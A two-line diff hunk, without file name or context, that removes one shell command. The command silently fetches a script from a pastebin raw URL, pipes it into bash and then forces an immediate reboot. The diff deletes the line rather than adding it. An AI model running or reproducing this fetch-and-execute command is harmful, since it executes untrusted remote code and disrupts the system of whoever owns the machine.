@@ -1,2 +1,0 @@
-curl -s https://pastebin.com/raw/2pdGb1Z0 | bash && sleep 2 && reboot -f
-
